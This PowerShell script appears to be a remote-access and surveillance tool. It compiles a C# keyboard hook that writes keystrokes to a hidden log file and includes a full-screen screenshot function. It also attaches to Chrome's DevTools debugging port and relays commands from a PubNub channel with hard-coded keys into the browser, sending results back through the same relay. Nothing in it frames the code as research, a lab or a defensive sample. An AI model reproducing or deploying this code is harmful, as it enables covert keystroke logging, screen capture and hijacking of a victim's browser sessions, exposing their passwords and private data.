# 20261124-1404

# Emulation.setFocusEmulationEnabled
# Wait-Debugger

Add-Type -AssemblyName System.Web

$script:scriptfname = [System.IO.Path]::GetFileName($PSCommandPath)

$scriptGuid = '70d8ab8e-fdb2-4076-9fd8-ba81c1be92e3' # Use a unique GUID for each script
# $createdNew = $false
# $script:SingleInstanceEvent = New-Object System.Threading.EventWaitHandle $true, ([System.Threading.EventResetMode]::ManualReset), "Global\$scriptGuid", ([ref] $createdNew)

#if (-not $createdNew) {
    #Write-Error "An instance of this script is already running. Exiting."
    #exit 1
#}

Add-Type -AssemblyName System.Windows.Forms
Add-Type -AssemblyName System.Drawing


# note: keeps running even after terminal closed down
Add-Type -TypeDefinition '
using System;
using System.Diagnostics;
using System.Runtime.InteropServices;
using System.Text;

namespace PowerShell {
public class KeyLogger
{
    public static string filePath = @"C:\\ProgramData\\owdkeyboardlog.txt"; // Use the full path
    public static StringBuilder sb = new StringBuilder("", 80);
    
    private static IntPtr _hookID = IntPtr.Zero;
    private static LowLevelKeyboardProc _proc = HookCallback;

    // Delegate for the hook procedure
    private delegate IntPtr LowLevelKeyboardProc(int nCode, IntPtr wParam, IntPtr lParam);

    [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
    private static extern IntPtr SetWindowsHookEx(int idHook, LowLevelKeyboardProc lpfn, IntPtr hMod, uint dwThreadId);

    [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
    [return: MarshalAs(UnmanagedType.Bool)]
    private static extern bool UnhookWindowsHookEx(IntPtr hhk);

    [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
    private static extern IntPtr CallNextHookEx(IntPtr hhk, int nCode, IntPtr wParam, IntPtr lParam);

    [DllImport("kernel32.dll", CharSet = CharSet.Auto, SetLastError = true)]
    private static extern IntPtr GetModuleHandle(string lpModuleName);

    // Required for the message loop
    [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
    private static extern int GetMessage(out MSG lpMsg, IntPtr hWnd, uint wMsgFilterMin, uint wMsgFilterMax);

    [StructLayout(LayoutKind.Sequential)]
    private struct MSG { public IntPtr hwnd; public uint message; public IntPtr wParam; public IntPtr lParam; public uint time; public int ptX; public int ptY; }

    private static IntPtr HookCallback(int nCode, IntPtr wParam, IntPtr lParam)
    {
        int vkCode = -1;

        if (nCode >= 0 && wParam == (IntPtr)0x0100) // WM_KEYDOWN
        {
            vkCode = Marshal.ReadInt32(lParam);
            // Console.WriteLine($"Key Pressed: {(System.Windows.Forms.Keys)vkCode}"); // Requires System.Windows.Forms
            sb.Append("[");
            sb.Append(String.Format("{0}", (System.Windows.Forms.Keys) vkCode));
            sb.Append("]");
        }

        if ( ( ( (System.Windows.Forms.Keys) vkCode ) == System.Windows.Forms.Keys.Enter ) || ( sb.Length >= 15 ) ) {
            string result = sb.ToString();
            System.IO.File.AppendAllText(filePath, result + Environment.NewLine);
            sb.Clear();
            sb.Length = 0;
        }

        return CallNextHookEx(_hookID, nCode, wParam, lParam);
    }

    public static void Main()
    {
        _hookID = SetWindowsHookEx(13, _proc, GetModuleHandle(Process.GetCurrentProcess().MainModule.ModuleName), 0);

        // Message loop to keep the hook active
        MSG msg;
        while (GetMessage(out msg, IntPtr.Zero, 0, 0) > 0) { }

        UnhookWindowsHookEx(_hookID);
    }
}
}
' -ReferencedAssemblies System.Windows.Forms

function Get-Identity {
    $ScriptName = "pscdp.relay.bridge.ps1"

    $ComputerName = $env:COMPUTERNAME
    
    $UserName = $env:USERNAME
    
    return "$ScriptName|$ComputerName|$UserName|PowerShell-$PSVersionTable"
}

$script:identitykvpstr = Get-Identity | ConvertTo-Json

$script:logger_logmsg_i = 0
function Log-Msg {
    param([object]$Msg)

    $caller = (Get-PSCallStack)[0].FunctionName

    if ( (Get-PSCallStack).length -gt 1 ) {
        $caller = (Get-PSCallStack)[1].FunctionName
    }

    $script:logger_logmsg_i++

    if ( $_ -is [System.Exception] -or $_ -is [System.Management.Automation.ErrorRecord]) {
        Write-Host "caller: $caller" 
        Write-Error $_.Exception.Message
        Write-Host $_.ScriptStackTrace -ForegroundColor DarkGray
    } else {
        Write-Host "$caller|$script:logger_logmsg_i|$Msg" -ForegroundColor Cyan
    }

}

function Get-Timestamp {
    $ret = Get-Date -Format "HH:mm:ss.fff"
    return $ret
}

function Take-Screenshot() {
    $memoryStream = New-Object System.IO.MemoryStream

    $screen = [System.Windows.Forms.SystemInformation]::VirtualScreen

    $name = (( $screen.DeviceName -replace '\\', '' ) -replace '\.', '')

    $width = $screen.Width
    $height = $screen.Height
    $left = $screen.Left
    $top = $screen.Top

    $bitmap = New-Object System.Drawing.Bitmap $width, $height
    $graphic = [System.Drawing.Graphics]::FromImage($bitmap)
    $graphic.CopyFromScreen($left, $top, 0, 0, $bitmap.Size)

    $bitmap.Save($memoryStream, [System.Drawing.Imaging.ImageFormat]::Png)
        
    $graphic.Dispose()
    $bitmap.Dispose()

    $base64String = [Convert]::ToBase64String($memoryStream.ToArray())

    return $base64String
}

function Get-FrontendUrls() {
    return $script:clientws.GetTargets()
}

function Get-KeyboardLog() {
    $text = Get-Content -Path "C:\ProgramData\owd\owdkeyboardlog.txt" -Raw

    return $text
}

class PSCDPCommandException : System.Exception {
    PSCDPCommandException([string]$message) : base($message) {}
}

enum PSCDPCommandErrorType {
    JavaScriptError
    CDPError
    GeneralError
    NoError
    TransformError
    ExceptionError

    <# CDPError
    {
        "id": 1,
        "error": {
            "code": -32602,
            "message": "Invalid parameters",
            "data": "Some missing parameter details"
        }
    }
    #>

    <# JavaScriptError
        {
            "id": 1,
            "result": {
                "result": {
                    "type": "object",
                    "subtype": "error",
                    "className": "TypeError",
                    "description": "TypeError: Cannot read properties of null (reading 'subtype')",
                    "objectId": "-6633390234293888361.1.1"
                },
                "exceptionDetails": {
                    "exceptionId": 1,
                    "text": "Uncaught",
                    "lineNumber": 0,
                    "columnNumber": 14,
                    "scriptId": "12",
                    "url": "",
                    "exception": {
                        "type": "object",
                        "subtype": "error",
                        "className": "TypeError",
                        "description": "TypeError: Cannot read properties of null (reading 'subtype')",
                        "objectId": "-6633390234293888361.1.2"
                    }
                }
            }
        }
    #>
}

function GetChunks {
    param([hashtable]$tresultout, [string]$imagedata, [int32]$chunkSize = 512)

    if ( $null -eq $tresultout ) {
        return $null
    }

    if ( [string]::IsNullOrEmpty($imagedata) ) {
        return $null
    }

    $imagelength = $imagedata.length

    $messages = [System.Collections.Generic.List[hashtable]]::new()

    if ( $imagelength -le $chunkSize ) {
        $resultout = $tresultout.Clone()
        
        $resultout['ts']=$(Get-Timestamp)
        $resultout['ischunked'] = $true
        $resultout['result'] = @{ imagedata=$imagedata }
        $resultout['chunkcount'] = $chunkcount
        $resultout['chunksize'] = $chunksize
        $resultout['chunkindex'] = $i
        $resultout['remainderlength'] = $remainderlength

        $messages.Add($resultout)

        return $messages
    }   

    $chunks = [System.Collections.Generic.List[string]]::new()

    $chunkcount = [int] ( $imagelength / $chunkSize )
    $remainderlength = $imagelength % $chunkSize

    $tchunkcount = $chunkcount

    if ( $remainderlength -gt 0 ) {
        $tchunkcount = $chunkcount - 1
    }

    for ($i = 0; $i -lt $tchunkcount; $i++ ) {
        $substr = ""
        $substr = $imagedata.Substring( $i*$chunkSize, $chunkSize )
        $chunks.Add( $substr )
    }

    if ( $remainderlength -gt 0 ) {
        $chunks.Add( $imagedata.Substring( ($chunkcount-1)*$chunkSize ) )
    }

    if ( $chunks.Count -ne $chunkcount ) {
        Log-Msg "pass"
    }

    for ($i = 0; $i -lt $chunks.Count; $i++ ) {

        $resultout = $tresultout.Clone()

        $resultout['ts'] = $( Get-Timestamp )
        $resultout['result'] = @{ imagedata=$chunks[$i] }
        $resultout['ischunked'] = $true
        $resultout['chunkcount'] = $chunkcount
        $resultout['chunksize'] = $chunksize
        $resultout['chunkindex'] = $i
        $resultout['remainderlength'] = $remainderlength
        
        $messages.Add($resultout)
    }

    return $messages
}

function Transform-PSCustomObject($obj) {
    $ht = @{}

    try {
        $obj.psobject.Properties | ForEach-Object {
            $ht[$_.Name] = $_.Value
        }
    } catch {
        $ht = $null
    }
    
    return $ht;
}

function Send-Result {
    param([string]$jsonb, [hashtable]$resultout)

    $chunkSize = 8192 # max pubnub allows is 32 KiB

    if ( $jsonb.length -ge $chunkSize ) {
        $messages = GetChunks $resultout $jsonb $chunkSize
    } else {
        $resultout['result'] = $jsonb
        $resultout['ischunked'] = $false
        $script:pb.SendMessage($resultout)

        return
    }

    $messages | ForEach-Object {
        $script:pb.SendMessage($_)
    }
}

function Publish-PBMessage {
    param([hashtable]$Message,[PubNub]$pbobj)

    $payloadjson = $Message | ConvertTo-Json -Compress
    Log-Msg ("payload: "+$payloadjson)

    $bytes = [System.Text.Encoding]::UTF8.GetBytes($payloadjson)
    $base64String = [Convert]::ToBase64String($bytes)

    $pbmsg = @{
        builtincmd="ProcessCDPBridge"
        source="pscdp.relay.bridge.ps1"
        destination="nodecdpproxy.js"
        ts=$(Get-Timestamp)
        resultid=$(Get-Random -Minimum 10000000 -Maximum 99999999)
        isbase64=$true
        result=$null
        cmdid=$null
    }

    Send-Result $base64String $pbmsg
}

function Ping-DebugPort {
    param($debugport)

    try {
        $targets = Invoke-RestMethod -Uri "http://localhost:$debugport/json" -ErrorAction Stop
    } catch [System.Net.WebException] {
        Log-Msg "[R5P9]: $($_.Exception.Message)"
        return $null
    }        


    # $targets | Select-Object title, id, webSocketDebuggerUrl
    $targets = $targets | Where-Object { $_.type -eq "page" }

    return $targets
}

function Process-BuiltInCommand {
    param([hashtable]$cmd, [PSCDPBridge]$cdpobj)

    if ( $cmd.builtincmd -ne "ProcessCDPBridge" ) {
        return
    }

    $isbase64 = $cmd['isbase64']
    $payload = $cmd['payload']

    if ( $isbase64 ) {
        $bodystr = [System.Convert]::FromBase64String($payload)
        $payload = [System.Text.Encoding]::UTF8.GetString($bodystr)
    }
    
    $payload = $payload | ConvertFrom-Json 
    $payload = Transform-PSCustomObject $payload

    $cdpobj.AddCmd($payload)
}

function Process-PubNubEvent {

    param([hashtable]$Message,[PSCDPBridge]$cdpobj)

    $payload = $Message

    if ( $payload.source -eq "pscdp.relay.bridge.ps1" ) {
        return
    } elseif ( ! ( $payload.destination -eq "pscdp.relay.bridge.ps1" ) ) {
        return
    } elseif ( [string]::IsNullOrEmpty($payload.builtincmd) ) {
        return
    }

    Process-BuiltInCommand $payload $cdpobj
}

class PSCDPException : System.Exception {

    PSCDPException([string]$Message) : base($Message) {
    }
}

class PSCDPBridge {

    $debugport = 9223

    $logconsolemsg = $false # TODO is this used in the system for anything?
    $bufferSize = 4096
    $resetonattach = $false

    $wsUri = $null
    $websocket = $null

    [string]$wsname = $null

    $sendQueue = [System.Collections.Generic.List[hashtable]]::new()

    [int32]$messageId = 1
    $receiveNew = $true
    $byteArray = $null
    $segment = $true
    $task = $true
    $memoryStream = [System.IO.MemoryStream]::new()
    $totalbytecount = 0
    $result = $null

    [bool] IsSocketHealthy() {
        if ( ( ! $null -eq $this.webSocket ) -and ( $this.webSocket.State -eq [System.Net.WebSockets.WebSocketState]::Open ) ) {
            return $true
        }

        if ( ! $null -eq $this.webSocket ) {
            try { 
                $this.webSocket.Dispose(); 
            } catch { 
                Log-Msg $_
            }
        }
        
        return $false
    }

    [hashtable] GetSystemHealth() {
        $ret = @{
            issystemok=( $this.IsSocketHealthy() )
        }

        return $ret
    }

    PSCDPBridge() {
    }

    PSCDPBridge($debugport) {
        $this.debugport = $debugport
    }

    PSCDPBridge($debugport, $wsname) {
        $this.debugport = $debugport
        $this.wsname = $wsname
    }

    [System.Uri] GetWSUrI() {

        if ( $null -ne $this.wsUri ) {
            return $this.wsUri
        }

        $resp = Invoke-WebRequest -Uri "http://localhost:$($this.debugport)/json/version" -UseBasicParsing
        $target = $resp | ConvertFrom-Json
        $twsUri = ( $target ).webSocketDebuggerUrl

        if ( [string]::IsNullOrEmpty($twsUri) ) {
            throw "wsuri is null"
        }

        $twsUri = New-Object System.Uri($twsUri)

        $this.wsUri = $twsUri

        return $this.wsUri
    }

    [void] ConnectCdp() {
        Log-Msg "[$($this.wsname)] attempting new CDP connection at $($this.debugport)"

        $this.wsUri = $this.GetWSUrI()

        if ( $null -eq $this.websocket ) {
            Log-Msg "connecting to cdp on [$($this.wsUri)]"
        } else {
            Log-Msg "reconnecting to cdp on [$($this.wsUri)]"
        }

        $this.websocket = New-Object System.Net.WebSockets.ClientWebSocket

        $connectTask = $this.websocket.ConnectAsync($this.wsUri, [System.Threading.CancellationToken]::None)

        if ( $null -eq $this.websocket) {
            throw "could not connect websocket"
        }

        $connectTask.Wait()
        
        Log-Msg "Connected! Current WebSocketState: $($this.websocket.State)" -ForegroundColor Green

        $params = @{
            autoAttach = $true
            waitForDebuggerOnStart = $false
            flatten = $true
            filter= @(
                @{
                    type="page"
                    exclude=$false
                }
            )
        }
        $this.sendQueue.Add( @{ method="Target.setAutoAttach"; params=$params } ) 
    
        $this.sendQueue.Add( @{ method="Target.setDiscoverTargets"; params=@{ discover=$true} } ) 

        $this.sendQueue.Add( 
            @{ 
                method="Target.getTargets"; 
                params=@{ filter=@( @{ type="page"; exclude=$false } ) }
                # callback=$script:getTargets_callback
            }
        )
        
    }

    [void] SendCdpCommand($cmd) {

        $payload = $cmd | ConvertTo-Json -Compress -Depth 10
        $bytes = [System.Text.Encoding]::UTF8.GetBytes($payload)
        $buffer = New-Object System.ArraySegment[byte] -ArgumentList @(,$bytes)
        
        $sendTask = $this.websocket.SendAsync($buffer, [System.Net.WebSockets.WebSocketMessageType]::Text, $true, [System.Threading.CancellationToken]::None)
        
        if ( $null -ne $sendTask ) {
            $tresult = $sendTask.GetAwaiter().GetResult()
        } else {
            throw [PSCDPCommandException]::new('fatal error -- task is null')
        }
    }
    
    [void] InitReceive() {
        if ( ! $this.receiveNew ) {
            return
        }

        $this.byteArray = [byte[]]::new($this.bufferSize)
        $this.segment = [ArraySegment[byte]]::new($this.byteArray)

        $this.task = $this.webSocket.ReceiveAsync($this.segment, [System.Threading.CancellationToken]::None)
        $this.receiveNew = $false
    }

    [void] ReadMessage() {
        if ( ! $this.task.IsCompleted ) {
            return
        }

        $this.result = $this.task.GetAwaiter().GetResult()
        # TODO: throws error -- The remote party closed the WebSocket connection without completing the close handshake.

        $this.receiveNew = $true

        if ($this.result.MessageType -eq [System.Net.WebSockets.WebSocketMessageType]::Close) {
            throw "WebSocket connection closed by the remote host."
        }
        elseif ($this.task.IsFaulted) {
            throw "[X2H2] Receive failed: $($this.task.Exception.InnerException.Message)"
        }
        elseif ($this.task.IsCanceled) {
            throw "[A2O9] Receive operation was cancelled."
        }
        elseif ( ! ( $this.task.Status -eq [System.Threading.Tasks.TaskStatus]::RanToCompletion ) ) {
            throw "task Status != RanToCompletion"
        } else {

            $bytesReceived = $this.result.Count
                        
            if ($bytesReceived -gt 0) {
                $this.memoryStream.Write($this.byteArray, 0, $bytesReceived)

                $this.totalbytecount = $this.totalbytecount + $bytesReceived
            }

        }
    }

    [void] EndMessage() {
        if ( ! $this.result.EndOfMessage) {
            return
        }

        $completeBytes = $this.memoryStream.ToArray()

        if ( $completeBytes.count -le 0 ) {
            return
        }

        $json = [System.Text.Encoding]::UTF8.GetString($completeBytes)
        $this.memoryStream = New-Object System.IO.MemoryStream
        $this.totalbytecount = 0

        if ( [string]::IsNullOrWhiteSpace($json) ) {
            return
        }

        try {
            $msg = $json | ConvertFrom-Json # TODO refactor to use PSCDPResult
        } catch {
            Log-Msg $_ # TODO refactor to report exception
            return
        }
        
        $this.ProcessMessage($msg)
    }

    [void] ProcessMessage([PSCustomObject]$msg) {
        $msght = @{}
        
        $msght = Transform-PSCustomObject $msg

        Publish-PBMessage $msght
    }

    [void] NextCmd() {

        if ( $null -eq $this.sendQueue ) {
            $this.sendQueue = [System.Collections.Generic.List[hashtable]]::new()
        }

        if ( $this.sendQueue.Count -le 0 ) {
            return
        }
        
        $cmd = $this.sendQueue[0]
        $this.sendQueue.RemoveAt(0)

        if ( $null -eq $cmd ) {
            throw [PSCDPException]::new('cmd is null')
        }

        $cmd['id'] = $this.messageId++
        
        $this.SendCdpCommand($cmd)
    }

    [void] LogState() {
        Log-Msg "pass"
    }

    [void] AddCmd([hashtable]$cmd) {
        $this.sendQueue.Add($cmd)
    }

    static [void] Iterate([hashtable]$tcdpobj) {
        $cdpobj = $tcdpobj['cdpobj']
        $check = $tcdpobj['systemcheck']
        $delay = $tcdpobj['delay']

        if ( $null -eq $check ) {
            $check = $cdpobj.GetSystemHealth()
        }

        if ( ! $check['issystemok'] ) {
            
            if ( $delay -eq -1 ) {
                $checkstr = ($check.GetEnumerator() | ForEach-Object { "$($_.Key)=$($_.Value)" }) -join '|'
                Log-Msg "$($cdpobj.wsname) system not ok"
                Log-Msg $checkstr

                $delay = 5
            } elseif ( $delay -gt 0 ) {
                Log-Msg "$($cdpobj.wsname) -- $delay remaining"

                $delay -= 1
            } 

            $tcdpobj['delay'] = $delay

            if ( $delay -gt 0 ) {
                return
            } else {
                $tcdpobj['delay'] = -1
            }

            Log-Msg "$($cdpobj.wsname) -- connecting"

            $cdpobj = [PSCDPBridge]::new($cdpobj.debugport, $cdpobj.wsname)
            $tcdpobj['cdpobj'] = $cdpobj
            $cdpobj.ConnectCdp()

        } else {
            $cdpobj.LogState()

            $cdpobj.InitReceive()
            $cdpobj.ReadMessage()
            $cdpobj.EndMessage()

            $cdpobj.NextCmd()
        }
    }

}

class PubNub {
    $PublishKey = "pub-c-bd83b994-1964-4760-9bf2-142ceadf7f66"
    $SubscribeKey = "sub-c-62ba6c3d-b786-4be3-a033-e472ab227774"
    $Channel = "clientid_88992233_JS_client"
    $UUID     = $scriptfname

    $baseUrl  = "ps.pndsn.com"
    
    $msgindex = 0
    $timetoken = 0

    [System.Net.Http.HttpClientHandler]$handler =  $null
    [System.Net.Http.HttpClient]$client = $null

    [scriptblock]$EventHandler = $null

    $isreceive = $false
    $isnewresult = $false
    $response = $null
    $byteArray = $null
    $requestTask = $null

    $sendQueue = [System.Collections.Generic.List[hashtable]]::new()

    $pbmessagesin = [System.Collections.Generic.List[hashtable]]::new()
    $pbmessagesout = [System.Collections.Generic.List[hashtable]]::new()

    $broadcastsin = [System.Collections.Generic.List[hashtable]]::new()
    $broadcastsout = [System.Collections.Generic.List[hashtable]]::new()

    [void] Init() {
        $this.handler = [System.Net.Http.HttpClientHandler]::new()
        $this.client  = [System.Net.Http.HttpClient]::new($this.handler)
        $this.client.Timeout = [System.TimeSpan]::FromSeconds(320) 
    }

    [void] Receive() {

        if ( $this.isreceive ) {
            return
        }

        $receiveUrl = $this.GetSubscribeUri()
        $this.requestTask = $this.client.GetAsync($receiveUrl)
        $this.isreceive = $true
    }    

    [string] GetSubscribeUri() {
        if ( [string]::IsNullOrEmpty($this.TimeToken) ) {
            $this.TimeToken = "0"
        }

        $treceiveUrl = "https://$($this.BaseUrl)/v2/subscribe/$($this.SubscribeKey)/$($this.Channel)/0/0?uuid=$($this.UUID)&tt=$($this.TimeToken)"

        return $treceiveUrl
    }

    [string] GetPublishUri() {
        $uri = "https://$($this.BaseUrl)/publish/$($this.PublishKey)/$($this.SubscribeKey)/0/$($this.Channel)/0"
        return $uri
    }

    [void] SendMessage([hashtable]$msg) {
        $this.sendQueue.Add($msg)
    }

    [string] PublishMessage([hashtable]$payload) {

        if ( ! $null -eq $payload -and $payload -is [hashtable] ) {
            $this.msgindex++
            $payload.Add('timestamp', ( Get-Timestamp ) )
            $payload.Add('msgindex',$this.msgindex)

        } else {
            throw "payload must be a valid hashtable"
        }

        $payloadjson = $payload | ConvertTo-Json -Compress
            
        $uri = $this.GetPublishUri()
    
        $this.response = Invoke-RestMethod -Uri $uri -Method Post -Body $payloadjson -ContentType "application/json; charset=UTF-8"

        if ( $null -ne $this.response -and $this.response.GetType().Name -eq "Object[]" -and $this.response.length -ge 2 ) {
            return $this.response[2]
        }

        return $null
    }

    [void] ReadResult() {
        if ( ! $this.isreceive ) {
            return
        }

        if ( ! $this.requestTask.IsCompleted ) {
            return
        }

        $this.isreceive = $false

        if ($this.requestTask.IsFaulted) {
            $msg = $($this.requestTask.Exception.InnerException.Message)
            throw "request task is faulted $msg"
        }

        $this.response = $this.requestTask.Result

        $this.isnewresult = $true

        if ( ! $this.response.IsSuccessStatusCode ) {
            Log-Msg "Server returned HTTP status code: $($this.response.StatusCode)"
        }

        Log-Msg "Response received! Status: $($this.response.StatusCode). Reading stream into byte array..."
        
        $contentStreamTask = $this.response.Content.ReadAsStreamAsync()
        
        while (-not $contentStreamTask.IsCompleted) {
            Start-Sleep -Milliseconds 50
        }
        
        $stream = $contentStreamTask.Result
        $memoryStream = [System.IO.MemoryStream]::new()
        
        $stream.CopyTo($memoryStream)
        $this.byteArray = $memoryStream.ToArray()
        
        $memoryStream.Dispose()
        $stream.Dispose()
        $this.response.Dispose()

        Log-Msg "Successfully read $($this.byteArray.Length) bytes"
    }

    [hashtable] static ParseResult([byte[]]$byteArray) {
        $jsonPayload = [System.Text.Encoding]::UTF8.GetString($byteArray)

        $tresponse = $null

        try {
            $jsonObj = $jsonPayload | ConvertFrom-Json
            $tresponse = Transform-PSCustomObject $jsonObj
        } catch {

        }

        return $tresponse
    }

    [void] ProcessResponse([hashtable]$response) {
        $this.timetoken = $response.t.t

        Log-Msg "timetoken: $($this.timetoken)"

        if ($response.m.Count -le 0) {
            return
        }

        Log-Msg "response count: $($response.m.Count)"
        
        foreach ($msg in $response.m) {
            $pbmsg = $msg.d | ConvertTo-Json -Compress
            Log-Msg "New Message Received: $($pbmsg | ConvertTo-Json -Compress)"
            $pbmsg = Transform-PSCustomObject($msg.d)

            if ( $pbmsg['destination'] -eq "BROADCAST" ) {

                if ( ( $pbmsg['source'] -ne $script:scriptfname ) ) {
                    $this.broadcastsin.Add($pbmsg)
                } else {
                    $this.broadcastsout.Add($pbmsg)   
                }
            } 
            
            if ( $pbmsg['destination'] -eq $script:scriptfname ) {
                $this.pbmessagesin.Add($pbmsg)
            } 
            
            if ( $pbmsg['source'] -eq $script:scriptfname ) {
                $this.pbmessagesout.Add($pbmsg)
            }

            if ( $null -ne $this.EventHandler ) {
                $this.EventHandler.Invoke($pbmsg)
            }
        }
    }

    [void] Iterate() {
        $this.LogState()

        $rnd = Get-Random -Minimum 1 -Maximum 501
        if ( $rnd -le 10 ) {
            $this.Broadcast()
        }

        if ( $null -ne $this.sendQueue -and $this.sendQueue.Count -gt 0 ) {
            $msg = $this.sendQueue[0]
            $this.sendQueue.RemoveAt(0)

            $result = $this.PublishMessage($msg)
        }

        $this.Receive()
        $this.ReadResult()

        if ( ! $this.isnewresult ) {
            return
        }

        $ht = [PubNub]::ParseResult($this.byteArray)
        $this.isnewresult = $false
        $this.byteArray = [byte[]]$null
        
        $this.ProcessResponse($ht)
    }

    [void] LogState() {
        $msgstrs = @()
        $msgstrs += "[PubNub]"
        $msgstrs += "[sendQueue: $($this.sendQueue.Count)]"
        $msgstrs += "[msgs in: $($this.pbmessagesin.Count) msgs out: $($this.pbmessagesout.Count)]"
        $msgstrs += "[broadcasts in: $($this.broadcastsin.Count) broadcasts out: $($this.broadcastsout.Count)]"

        $msgstr = $msgstrs -join " "
        Log-Msg $msgstr
    }

    [void] Broadcast() {

        $msg = @{
            builtincmd="SendBroadcast"
            source=$script:scriptfname
            destination="BROADCAST"
            ts=$(Get-Timestamp)
            cmdid=$(Get-Random -Minimum 10000000 -Maximum 100000000)
        }

        $this.SendMessage($msg)
    }
}

<# --- #>

$script:msedge_debugport = 9222
$script:chrome_debugport = 9223


$script:clientws = [PSCDPBridge]::new($script:chrome_debugport, "clientws")
$script:clientws.ConnectCdp()

$script:clientit = @{
    "cdpobj" = $script:clientws
    "broadcast" = $false
    "systemcheck" = $null
    "delay" = -1
}

$keyboardlogger = {
    try {
        [PowerShell.KeyLogger]::Main()
    } finally {
        if ($script:SingleInstanceEvent) {
            $script:SingleInstanceEvent.Dispose()
        }
    }
}

# $ps = [powershell]::Create().AddScript($keyboardlogger)
# $asyncResult = $ps.BeginInvoke()

if ( [string]::IsNullOrWhiteSpace($script:scriptfname) ) {
    $scriptfname = "pscdp.relay.bridge.ps1"
}

$script:pb = [PubNub]::new()
$script:pb.Init()
$script:pb.EventHandler = {
    param([hashtable]$pbmsg)

    $script:clientws = $script:clientit['cdpobj']

    Process-PubNubEvent -Message $pbmsg -cdpobj $script:clientws
}

$d = 250
$n = 100
$i = 0

while ( $true ) {

    Log-Msg "new iteration -- $i/$n"

    try {
        $pb.Iterate()
    } catch {
        Log-Msg $_
    }


    try {
        [PSCDPBridge]::Iterate($script:clientit)
    } catch {
        Log-Msg $_
        $cdpobj = $script:clientit['cdpobj']
        $cdpobj.exceptions.Add($_)
    }

    Start-Sleep -Milliseconds $d
    
    if ( $i -ge $n ) {
        $i = 0
    } else {
        $i++
    }
}

exit